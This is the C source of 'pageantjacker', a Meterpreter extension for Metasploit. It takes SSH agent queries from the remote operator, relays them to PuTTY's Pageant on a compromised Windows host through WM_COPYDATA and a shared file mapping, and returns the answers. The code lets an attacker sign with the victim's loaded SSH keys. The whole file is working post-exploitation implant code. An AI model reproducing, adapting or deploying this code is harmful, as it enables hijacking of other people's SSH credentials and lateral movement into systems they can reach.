/*!
 * @file pageantjacker.c
 * @brief Entry point and intialisation functionality for the pageantjacker extention.
 */
#include "../../common/common.h"
#include "pageantjacker.h"

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

Command customCommands[] =
{
	COMMAND_REQ("pageant_send_query", request_pageant_send_query),
	COMMAND_TERMINATOR
};

DWORD request_pageant_send_query(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD rawDataSizeIn = NULL;
	Byte *rawDataIn = NULL;
	PAGEANTQUERYRESULTS results = { 0 };

	// Retrieve from metasploit
	rawDataSizeIn = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
	rawDataIn = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
	
	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", rawDataSizeIn, rawDataIn);

	// Make sure that the length marker can never go above AGENT_MAX (i.e. prevent a stack based buffer overflow later)
	if (rawDataSizeIn >= AGENT_MAX) {
		rawDataSizeIn = AGENT_MAX - 1;
	}

	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
	dprintf("[PJ(request_pageant_send_query)] Forwarding query to Pageant");
	send_query_to_pageant(rawDataIn, rawDataSizeIn, (PAGEANTQUERYRESULTS *) &results);

	// Build the packet based on the respones from the Pageant interaction.
	packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
	packet_add_tlv_raw(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB, results.blob, results.bloblength);
	packet_add_tlv_uint(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.errorMessage);	
	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len %d, data is at 0x%p. Error message at 0x%p (%d)", results.result, results.bloblength, results.blob, &results.errorMessage, results.errorMessage);

	// Free the allocated memory once we are done
	if (results.blob) {
		free(results.blob);
		dprintf("[PJ(request_pageant_send_query)] Freed results blob");
	}

	// Transmit the packet to metasploit
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
* @brief Get the name of the extension.
* @param buffer Pointer to the buffer to write the name to.
* @param bufferSize Size of the \c buffer parameter.
* @return Indication of success or failure.
*/
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "pageantjacker", bufferSize - 1);
	return ERROR_SUCCESS;
}

void send_query_to_pageant(byte *query, unsigned int querylength, PAGEANTQUERYRESULTS *ret) {

	char strPuttyRequest[PAGENT_REQUEST_LENGTH] = { 0 }; // This will always be 23 chars. Initialised to zero here = no memset()
	COPYDATASTRUCT pageantCopyData;
	unsigned char *filemapPointer = NULL;
	HANDLE filemap = NULL;
	HWND hPageant = NULL;
	unsigned int protocolReturnLength = NULL;
	unsigned int apiResult = NULL;
	void *memcpyResult = NULL;

	// Initialise the results arrays
	ret->result = FALSE;
	ret->errorMessage = PAGEANTJACKER_ERROR_NOERROR;

	if (hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME)) {

		dprintf("[PJ(send_query_to_pageant)] Pageant Handle is %x",hPageant);

		// Generate the request string and populate the struct
		if (_snprintf_s(&strPuttyRequest, sizeof(strPuttyRequest), _TRUNCATE, "PageantRequest%08x", (unsigned int)GetCurrentThreadId())) { 
			pageantCopyData.dwData = AGENT_COPYDATA_ID;
			pageantCopyData.cbData = sizeof(strPuttyRequest);
			pageantCopyData.lpData = &strPuttyRequest;
			dprintf("[PJ(send_query_to_pageant)] Request string is at 0x%p (%s)", &pageantCopyData.lpData, pageantCopyData.lpData);

			// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
			// It will overwrite this memory block with the result of the query.
			filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
			if (filemap && filemap != INVALID_HANDLE_VALUE) {
				dprintf("[PJ(send_query_to_pageant)] CreateFileMappingA returned 0x%x", filemap);
				if (filemapPointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {
					dprintf("[PJ(send_query_to_pageant)] MapViewOfFile returned 0x%x", filemapPointer);

					// Initialise and copy the request to the memory block that will be passed to Pageant.
					SecureZeroMemory(filemapPointer, AGENT_MAX);
					if (querylength)
						memcpy(filemapPointer, query, querylength);

					dprintf("[PJ(send_query_to_pageant)] Request length: %d. Query buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X. Request buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", querylength, query[0], query[1], query[2], query[3], query[4], query[5], query[6], query[7], filemapPointer[0], filemapPointer[1], filemapPointer[2], filemapPointer[3], filemapPointer[4], filemapPointer[5], filemapPointer[6], filemapPointer[7]);
					
					// Send the request message to Pageant.
					dprintf("[PJ(send_query_to_pageant)] Ready to send WM_COPYDATA");
					if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageantCopyData)) {

						protocolReturnLength = get_length_response(filemapPointer)+4;
						dprintf("[PJ(send_query_to_pageant)] Result length: %d. Result buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", protocolReturnLength, filemapPointer[0], filemapPointer[1], filemapPointer[2], filemapPointer[3], filemapPointer[4], filemapPointer[5], filemapPointer[6], filemapPointer[7]);
						if (protocolReturnLength && protocolReturnLength<AGENT_MAX) {
							if (ret->blob = calloc(1, protocolReturnLength)) {
								memcpyResult = memcpy(ret->blob, filemapPointer, protocolReturnLength);
								ret->bloblength = protocolReturnLength;
								ret->result = TRUE;
								dprintf("[PJ(send_query_to_pageant)] Set Result to TRUE, copied memory to ret.blob (result: 0x%x)",memcpyResult);
							} else {
								dprintf("[PJ(send_query_to_pageant)] Malloc error (length: %d).", protocolReturnLength);
								ret->errorMessage = PAGEANTJACKER_ERROR_ALLOC;
							}
						}
					 } else {
						// SendMessage failed
						ret->errorMessage = PAGEANTJACKER_ERROR_SENDMESSAGE;
					 }
					 apiResult = UnmapViewOfFile(filemapPointer);
					 dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", apiResult);
				} else {
					// MapViewOfFile failed
					ret->errorMessage = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
				}
				apiResult = CloseHandle(filemap);
				dprintf("[PJ(send_query_to_pageant)] CloseHandle (from CreateFileMapping) returns %d.", apiResult);
			} else {
				// CreateFileMapping failed
				ret->errorMessage = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
			}
		} else {
			// _snprintf_s failed. Note that this should never happen because it could
			// mean that somehow %08x has lost its meaning. Essentially though this is
			// here to guard against buffer overflows.
			ret->errorMessage = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
		}

	} else {
		// Could not get a handle to Pageant. This probably means that it is not running.
		ret->errorMessage = PAGEANTJACKER_ERROR_NOTFOUND;
	}
	return;
}

DWORD get_length_response(byte *b) {
	return (b[3]) | (b[2] << 8) | (b[1] << 16) | (b[0] << 24);
}